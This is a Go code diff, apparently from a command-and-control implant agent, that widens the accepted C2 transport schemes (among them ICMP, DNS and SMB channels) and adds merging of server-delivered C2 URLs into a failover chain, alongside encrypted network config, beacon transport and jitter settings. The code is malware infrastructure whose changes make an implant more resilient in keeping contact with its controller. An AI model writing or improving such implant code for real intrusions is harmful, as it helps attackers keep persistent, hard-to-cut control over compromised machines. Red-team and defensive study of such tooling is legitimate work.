@@ -346,19 +346,71 @@ func decryptConfigBlob(blob string) []byte {
 	return plain
 }
 
-// validC2Schemes mirrors the authoritative prefix list enforced elsewhere
-// (see egress.go). A config-over-wire C2URL must use one of these schemes;
-// anything else is rejected rather than applied (defense-in-depth on top of the
+// validC2Schemes lists every transport the agent can dispatch. A
+// config-over-wire C2URL must use one of these schemes; anything else is
+// rejected rather than applied (defense-in-depth on top of the
 // already-authenticated decrypt).
-var validC2Schemes = []string{"http://", "https://", "tcp://", "tls://", "ssh://", "dns://", "smb://"}
+var validC2Schemes = []string{
+	"http://", "https://", "ws://", "wss://", "h2c://",
+	"grpc://", "grpcs://", "mtls://",
+	"tcp://", "tls://", "udp://", "quic://",
+	"icmp://", "dns://", "ssh://", "smb://",
+}
 
 func hasValidC2Scheme(u string) bool {
+	u = strings.ToLower(strings.TrimSpace(u))
 	for _, p := range validC2Schemes {
 		if strings.HasPrefix(u, p) {
 			return true
 		}
 	}
 	return false
+}
+
+// splitC2URLList normalizes the comma-separated C2URL form used by the
+// generator and the network-config path. Empty entries are dropped.
+func splitC2URLList(raw string) []string {
+	parts := strings.Split(raw, ",")
+	urls := make([]string, 0, len(parts))
+	for _, p := range parts {
+		if p = strings.TrimSpace(p); p != "" {
+			urls = append(urls, p)
+		}
+	}
+	return urls
+}
+
+// mergeServerC2URL replaces the primary endpoint with the one the server just
+// resolved while keeping the compile-time/persisted failover chain. The old
+// code overwrote the whole list with the single delivered URL, so a listener
+// failover silently disappeared after the first registration.
+func mergeServerC2URL(primary string, existing []string) []string {
+	primary = strings.TrimSpace(primary)
+	if primary == "" {
+		return existing
+	}
+	merged := make([]string, 0, len(existing)+1)
+	merged = append(merged, primary)
+	seen := map[string]struct{}{strings.ToLower(primary): {}}
+	for i, raw := range existing {
+		// existing[0] is the previous primary; the server-delivered URL
+		// replaces it rather than accumulating stale primaries on every
+		// config refresh.
+		if i == 0 {
+			continue
+		}
+		raw = strings.TrimSpace(raw)
+		if raw == "" {
+			continue
+		}
+		key := strings.ToLower(raw)
+		if _, ok := seen[key]; ok {
+			continue
+		}
+		seen[key] = struct{}{}
+		merged = append(merged, raw)
+	}
+	return merged
 }
 
 // applyServerNetworkConfig decrypts and applies a server-delivered network
@@ -383,13 +435,20 @@ func applyServerNetworkConfig(b64 string) {
 		logDebug("[config] network config decrypt failed, keeping defaults")
 		return
 	}
-	c2URL := nc.C2URL
+	c2URL := strings.TrimSpace(nc.C2URL)
 	if c2URL != "" && !hasValidC2Scheme(c2URL) {
 		logDebug("[config] network config: skipping C2URL with invalid scheme")
 		c2URL = ""
 	}
+	var mergedURLs []string
+	if c2URL != "" {
+		existing := c2URLsSnapshot()
+		if len(existing) == 0 {
+			existing = splitC2URLList(C2URL)
+		}
+		mergedURLs = mergeServerC2URL(c2URL, existing)
+	}
 	b := agentConfigBlob{
-		C2URL:               c2URL,
 		Protocol:            nc.Protocol,
 		BeaconTransport:     nc.BeaconTransport,
 		UserAgent:           nc.UserAgent,
@@ -432,6 +491,9 @@ func applyServerNetworkConfig(b64 string) {
 		b.Jitter = strconv.Itoa(nc.Jitter)
 	}
 	b.apply()
+	if len(mergedURLs) > 0 {
+		C2URL = strings.Join(mergedURLs, ",")
+	}
 	reparseNetworkConfig()
 	if err := saveNetworkConfig(b64); err != nil {
 		logDebug("[config] failed to persist network config")
